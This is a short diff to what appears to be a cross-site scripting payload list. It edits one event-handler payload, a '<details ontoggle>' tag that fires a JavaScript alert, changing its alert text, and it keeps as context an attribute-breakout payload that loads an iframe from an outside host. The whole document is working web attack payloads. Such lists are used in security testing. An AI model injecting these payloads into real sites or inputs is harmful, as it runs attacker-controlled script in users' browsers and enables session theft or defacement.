@@ -1,2 +1,2 @@
-<details open ontoggle="(()=>alert`ibrahimxss`)()"></details>
+<details open ontoggle="(()=>alert`xss`)()"></details>
 "><iframe src=//14.rs>
